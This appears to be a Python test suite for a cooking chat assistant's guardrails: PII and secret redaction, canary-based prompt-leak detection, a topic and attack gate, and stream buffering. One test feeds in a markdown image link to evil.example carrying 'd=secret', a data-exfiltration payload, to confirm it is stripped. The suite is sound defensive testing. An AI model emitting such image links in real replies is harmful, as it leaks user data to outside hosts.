import asyncio
import uuid
from collections.abc import AsyncIterator
from datetime import UTC, datetime
from pathlib import Path

import pytest
from chat_models import gate_model, last_user_text
from pydantic import SecretStr
from pydantic_ai import ToolReturn
from pydantic_ai.messages import (
    ImageUrl,
    ModelMessage,
    ModelRequest,
    ModelResponse,
    PartDeltaEvent,
    PartStartEvent,
    TextPart,
    TextPartDelta,
    ToolCallPart,
    ToolReturnPart,
    UserPromptPart,
)
from pydantic_ai.models.function import AgentInfo, DeltaToolCall, DeltaToolCalls, FunctionModel
from pydantic_ai_harness.guardrails import ToolCallInfo, ToolResultInfo

from linguini.app import create_app
from linguini.chat import guard
from linguini.chat.agent import build_agent, build_decision_model, decisions_key
from linguini.chat.deps import AgentDeps, GuardState
from linguini.chat.guard import (
    LEAK_NOTICE,
    REFUSALS,
    GateVerdict,
    GuardConfig,
    build_gate,
    earlier_exchange,
    finalize_for_storage,
    leak_free_args,
    redact_tool_result,
)
from linguini.chat.redact import LEAK_PHRASES, ReleaseBuffer, leak_at, redact_text, redact_value, screen
from linguini.config import Settings
from linguini.db import Database

pytestmark = pytest.mark.anyio

CANARY = "lgn-0123456789ab"


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("Hívj: +36 30 123 4567", "Hívj: [PHONE]"),
        ("06-20-987-6543", "[PHONE]"),
        ("06/1/234-5678", "[PHONE]"),
        ("+36301234567", "[PHONE]"),
        ("0036 1 234 5678", "[PHONE]"),
        ("+44 20 7946 0958", "[PHONE]"),
        ("írj: anna.kovacs@example.com", "írj: [EMAIL]"),
        ("4111 1111 1111 1111", "[CARD]"),
        ("HU42 1177 3016 1111 1018 0000 0000", "[IBAN]"),
        ("sk-proj-abcdefghijklmnopqrstuvwxyz123456", "[SECRET]"),
        ("ghp_abcdefghijklmnopqrstuvwxyz0123", "[SECRET]"),
        ("-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----\nthanks", "[SECRET]\nthanks"),
    ],
)
def test_redact_text_replaces_secrets_and_personal_data(text: str, expected: str) -> None:
    assert redact_text(text) == expected


@pytest.mark.parametrize(
    "text",
    [
        "2026-10-27 06:30",
        "1 kg 250 g liszt, 2 db tojás",
        "termék 1234567",
        "3x+7=22",
        "1/2 tsp só, 180 °C, 45 perc",
        "Kovács Anna és Béla",
        "+36 fok volt tegnap",
    ],
)
def test_redact_text_keeps_kitchen_text(text: str) -> None:
    assert redact_text(text) == text


def test_redaction_is_idempotent() -> None:
    once = redact_text("anna@example.com, +36 30 123 4567, 4111 1111 1111 1111")
    assert redact_text(once) == once


TEXT = (
    "Szia! Itt a recept. Hívj a +36 30 123 4567 számon, vagy írj: anna@example.com. "
    + "Keverd össze a lisztet és a cukrot. " * 12
    + "Végül süsd 180 fokon 25 percig!"
)


@pytest.mark.parametrize("step", [1, 2, 3, 7, 13, 50])
def test_release_buffer_matches_the_screened_text_whatever_the_chunking(step: int) -> None:
    buffer = ReleaseBuffer(CANARY, " [cut]", " [drift]")
    chunks = [buffer.feed(TEXT[i : i + step]) for i in range(0, len(TEXT), step)]
    chunks.append(buffer.finish())
    assert "".join(chunks) == screen(TEXT)
    assert not any("4567" in c or "anna@" in c for c in chunks)


def test_release_buffer_cuts_a_leak_at_the_sentence_before_it() -> None:
    text = "Persze. " + "Ez egy hosszú mondat a receptről. " * 8 + f"A jelölőm {CANARY}, és még más is. Vége."
    buffer = ReleaseBuffer(CANARY, " [cut]", " [drift]")
    out = "".join(buffer.feed(text[i : i + 4]) for i in range(0, len(text), 4)) + buffer.finish()
    assert out.endswith("receptről.  [cut]") or out.endswith("receptről. [cut]")
    assert CANARY not in out and buffer.cut
    assert buffer.feed("more") == "" and buffer.finish() == ""


def test_release_buffer_holds_an_unfinished_certificate_back() -> None:
    buffer = ReleaseBuffer(CANARY, " [cut]", " [drift]")
    head = "Here it is.\n-----BEGIN CERTIFICATE-----\n" + "QUJD\n" * 80
    released = buffer.feed(head)
    assert "-----BEGIN" not in released
    assert buffer.finish().startswith("-----BEGIN")


def test_screen_strips_images() -> None:
    assert screen("Nézd: ![gulyás](https://evil.example/c?d=secret) <img src=x>") == "Nézd: gulyás "


def test_leak_needs_the_canary_or_two_distinct_phrases() -> None:
    assert leak_at(f"marker {CANARY.upper()}", CANARY) == 7
    one = f"Remember: {LEAK_PHRASES[0]}."
    assert leak_at(one + " " + one, CANARY) is None
    two = f"{LEAK_PHRASES[0]} and {LEAK_PHRASES[1]}"
    assert leak_at(two, CANARY) == two.index(LEAK_PHRASES[1])


@pytest.mark.parametrize(
    ("off_topic", "attack", "reason"),
    [(0.69, 0.69, None), (0.7, 0.0, "off_topic"), (0.0, 0.7, "attack"), (0.95, 0.95, "attack")],
)
def test_gate_verdict_thresholds(off_topic: float, attack: float, reason: str | None) -> None:
    assert GateVerdict(off_topic=off_topic, attack=attack, language="en").block_reason() == reason


def test_tool_results_are_redacted_but_ids_kept() -> None:
    result = [{"id": "4111111111111111", "name": "tej", "notes": "hívd: +36 30 123 4567"}]
    info = ToolResultInfo(name="list_items", args={}, tool_call_id="c1", result=result)
    verdict = redact_tool_result(info)
    assert verdict.action == "replace"
    assert verdict.replacement == [{"id": "4111111111111111", "name": "tej", "notes": "hívd: [PHONE]"}]
    clean = ToolResultInfo(name="list_items", args={}, tool_call_id="c1", result=[{"name": "tej"}])
    assert redact_tool_result(clean).action == "allow"


def test_tool_arguments_carrying_the_canary_are_blocked() -> None:
    check = leak_free_args(CANARY)
    assert check(ToolCallInfo(name="set_item", args={"notes": "fine"}, tool_call_id="c")).action == "allow"
    leaking = ToolCallInfo(name="set_item", args={"notes": f"x {CANARY}"}, tool_call_id="c")
    assert check(leaking).action == "block"


def deps(tmp_path: Path) -> AgentDeps:
    return AgentDeps(
        db=Database(tmp_path / "unused.db"),
        household_id=uuid.uuid7(),
        household_name="Kovács",
        member_names=["Anna", "Béla"],
        user_id=uuid.uuid7(),
        user_name="Anna",
        thread_id=uuid.uuid7(),
        run_id=uuid.uuid7(),
        now=datetime(2026, 3, 4, 12, tzinfo=UTC),
        locale="hu-HU",
    )


def chunked(
    *chunks: str, seen: list[str] | None = None, then: ToolCallPart | None = None, calls: list[int] | None = None
) -> FunctionModel:
    calls = [] if calls is None else calls

    async def stream(messages: list[ModelMessage], info: AgentInfo) -> AsyncIterator[str | DeltaToolCalls]:
        calls.append(1)
        if seen is not None:
            seen.append(last_user_text(messages))
        for chunk in chunks:
            await asyncio.sleep(0)
            yield chunk
        if then is not None and len(calls) == 1:
            yield {1: DeltaToolCall(name=then.tool_name, json_args=then.args_as_json_str(), tool_call_id="c1")}

    return FunctionModel(stream_function=stream)


async def run_events(agent, prompt: str, run_deps: AgentDeps) -> tuple[str, list[ModelMessage]]:
    text: list[str] = []
    async with agent.iter(prompt, deps=run_deps) as run:
        async for node in run:
            if agent.is_model_request_node(node):
                async with node.stream(run.ctx) as stream:
                    async for event in stream:
                        if isinstance(event, PartStartEvent) and isinstance(event.part, TextPart):
                            text.append(event.part.content)
                        elif isinstance(event, PartDeltaEvent) and isinstance(event.delta, TextPartDelta):
                            text.append(event.delta.content_delta)
    assert run.result is not None
    return "".join(text), run.result.new_messages()


async def test_a_blocked_message_never_reaches_the_model(tmp_path: Path) -> None:
    calls: list[int] = []
    main = chunked("echo", calls=calls)
    gate = build_gate(gate_model(off_topic=0.95, language="hu"))
    run_deps = deps(tmp_path)
    shown, messages = await run_events(
        build_agent(main, GuardConfig(CANARY, gate)), "Írj egy Python függvényt", run_deps
    )
    assert shown == REFUSALS["off_topic", "hu"]
    assert calls == []
    assert run_deps.guard.blocked and run_deps.guard.off_topic == pytest.approx(0.95)
    texts = [p.content for m in messages if isinstance(m, ModelResponse) for p in m.parts if isinstance(p, TextPart)]
    assert texts == [REFUSALS["off_topic", "hu"]]


async def test_a_failing_or_slow_gate_lets_the_message_through(tmp_path: Path, monkeypatch) -> None:
    def broken(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
        raise RuntimeError("gate down")

    result = await build_agent(chunked("Szia!"), GuardConfig(CANARY, build_gate(FunctionModel(broken)))).run(
        "hi", deps=deps(tmp_path)
    )
    assert result.output == "Szia!"

    async def slow(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
        await asyncio.sleep(5)
        raise AssertionError

    monkeypatch.setattr(guard, "GATE_TIMEOUT", 0.05)
    run_deps = deps(tmp_path)
    result = await build_agent(chunked("Szia!"), GuardConfig(CANARY, build_gate(FunctionModel(slow)))).run(
        "hi", deps=run_deps
    )
    assert result.output == "Szia!" and not run_deps.guard.blocked and run_deps.guard.off_topic is None


async def test_the_model_and_the_gate_only_see_redacted_input(tmp_path: Path) -> None:
    model_saw: list[str] = []
    gate_saw: list[str] = []
    agent = build_agent(chunked("ok", seen=model_saw), GuardConfig(CANARY, build_gate(gate_model(seen=gate_saw))))
    result = await agent.run("Írj nekem: anna@example.com vagy +36 30 123 4567", deps=deps(tmp_path))
    assert model_saw == gate_saw == ["Írj nekem: [EMAIL] vagy [PHONE]"]
    prompts = [
        p.content for m in result.all_messages() for p in getattr(m, "parts", []) if p.part_kind == "user-prompt"
    ]
    assert prompts == ["Írj nekem: [EMAIL] vagy [PHONE]"]


async def test_a_phone_number_split_across_chunks_is_redacted_in_the_stream_and_history(tmp_path: Path) -> None:
    agent = build_agent(chunked("Hívd a boltot: +36 30 1", "23 4567, ők tudják. ", "Jó főzést!"))
    shown, messages = await run_events(agent, "hi", deps(tmp_path))
    assert shown == "Hívd a boltot: [PHONE], ők tudják. Jó főzést!"
    stored = [p.content for m in messages if isinstance(m, ModelResponse) for p in m.parts if isinstance(p, TextPart)]
    assert stored == [shown]


async def test_a_leaking_reply_is_cut_and_its_tool_calls_never_run(tmp_path: Path) -> None:
    then = ToolCallPart("remove_item", {"name": "tej", "user_confirmed": True})
    calls: list[int] = []
    main = chunked("Rendben. ", f"A jelölőm {CANARY}. ", "Más.", then=then, calls=calls)
    run_deps = deps(tmp_path)
    shown, messages = await run_events(build_agent(main, GuardConfig(CANARY)), "hi", run_deps)
    assert shown == "Rendben. " + LEAK_NOTICE["hu"]
    assert run_deps.guard.leaked
    assert calls == [1]
    parts = [p for m in messages if isinstance(m, ModelResponse) for p in m.parts]
    assert parts == [TextPart(shown)]


def test_finalize_for_storage_keeps_only_released_text_of_a_cancelled_reply(tmp_path: Path) -> None:
    run_deps = deps(tmp_path)
    run_deps.guard = GuardState(released={0: "Hívd: "}, cut_index=0)
    response = ModelResponse(parts=[TextPart("Hívd: +36 30 123 4567 most"), ToolCallPart("remove_item", {})])
    [stored] = finalize_for_storage([response], run_deps, CANARY)
    assert isinstance(stored, ModelResponse) and stored.parts == [TextPart("Hívd: ")]


def test_finalize_for_storage_cuts_an_unreleased_leak(tmp_path: Path) -> None:
    run_deps = deps(tmp_path)
    response = ModelResponse(parts=[TextPart(f"Rendben. A jelölőm {CANARY}."), ToolCallPart("remove_item", {})])
    [stored] = finalize_for_storage([response], run_deps, CANARY)
    assert isinstance(stored, ModelResponse)
    assert stored.parts == [TextPart("Rendben. " + LEAK_NOTICE["hu"])] and run_deps.guard.leaked


def test_release_buffer_reports_a_late_redaction_without_calling_it_a_leak() -> None:
    buffer = ReleaseBuffer(CANARY, " [cut]", " [drift]", raw="Hívd: +36 30 123 4567", sent="Hívd: +36 30 1")
    assert buffer.finish() == " [drift]"
    assert buffer.cut and not buffer.leaked


def test_release_buffer_holds_an_unclosed_html_image_back() -> None:
    buffer = ReleaseBuffer(CANARY, " [cut]", " [drift]")
    released = buffer.feed('Kész. <img alt="Szép. ' + "x " * 150)
    assert "<img" not in released
    assert released + buffer.finish() == "Kész. "


@pytest.mark.parametrize(
    ("messages", "expected"),
    [
        ([ModelRequest(parts=[UserPromptPart("hi")])], []),
        (
            [
                ModelRequest(parts=[UserPromptPart("Ötletek?")]),
                ModelResponse(parts=[ToolCallPart("list_items", {})]),
                ModelRequest(parts=[ToolReturnPart("list_items", [], "c")]),
                ModelResponse(parts=[TextPart("1. A 2. B")]),
                ModelRequest(parts=[UserPromptPart("A másodikat")]),
            ],
            ["Ötletek?", "1. A 2. B"],
        ),
        (
            [
                ModelRequest(parts=[UserPromptPart("régi")]),
                ModelResponse(parts=[TextPart("régi válasz")]),
                ModelRequest(parts=[UserPromptPart(["kép", ImageUrl("https://example.com/a.png")])]),
                ModelResponse(parts=[TextPart("x" * 600)]),
                ModelRequest(parts=[UserPromptPart("tovább")]),
            ],
            ["", "x" * 500],
        ),
    ],
    ids=["no-reply", "tool-call-reply-skipped", "multimodal-question"],
)
def test_earlier_exchange(messages: list[ModelMessage], expected: list[str]) -> None:
    texts = [p.content for m in earlier_exchange(messages) for p in m.parts if isinstance(p, UserPromptPart | TextPart)]
    assert texts == expected


def test_redact_value_keeps_tool_return_fields() -> None:
    value = ToolReturn(return_value={"notes": "anna@example.com"}, content="hívj: +36 30 123 4567", metadata={"k": 1})
    cleaned = redact_value(value)
    assert isinstance(cleaned, ToolReturn)
    assert cleaned.return_value == {"notes": "[EMAIL]"} and cleaned.content == "hívj: [PHONE]"
    assert cleaned.metadata == {"k": 1}


async def test_a_gate_failure_is_recorded(tmp_path: Path) -> None:
    def broken(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
        raise RuntimeError("gate down")

    run_deps = deps(tmp_path)
    await build_agent(chunked("Szia!"), GuardConfig(CANARY, build_gate(FunctionModel(broken)))).run("hi", deps=run_deps)
    assert run_deps.guard.gate_failed and not run_deps.guard.blocked


async def test_other_languages_get_the_english_refusal(tmp_path: Path) -> None:
    gate = build_gate(gate_model(off_topic=0.95, language="other"))
    result = await build_agent(chunked("x"), GuardConfig(CANARY, gate)).run("Écris du code", deps=deps(tmp_path))
    assert result.output == REFUSALS["off_topic", "en"]


@pytest.mark.parametrize(
    ("chat_url", "own_key", "expected"),
    [
        ("https://openrouter.ai/api/v1", None, "chat-key"),
        ("http://ollama:11434/v1", None, None),
        (None, None, None),
        ("http://ollama:11434/v1", "decisions-key", "decisions-key"),
        ("http://ollama:11434/v1", "", None),
    ],
)
def test_the_chat_key_only_goes_to_its_own_host(
    chat_url: str | None, own_key: str | None, expected: str | None
) -> None:
    settings = Settings(
        secret_key=SecretStr("x"),
        openai_base_url=chat_url,
        openai_api_key=SecretStr("chat-key"),
        decisions_api_key=SecretStr(own_key) if own_key else None,
    )
    key = decisions_key(settings)
    assert (key.get_secret_value() if key else None) == expected


def test_the_app_turns_the_gate_off_instead_of_leaking_the_key(tmp_path: Path, caplog) -> None:
    settings = Settings(
        secret_key=SecretStr("x"), data_dir=tmp_path, openai_base_url="http://ollama:11434/v1", guard_model="jev"
    )
    with pytest.raises(ValueError, match="LINGUINI_DECISIONS_API_KEY"):
        build_decision_model(settings, "jev")
    create_app(settings)
    assert "topic gate is off" in caplog.text
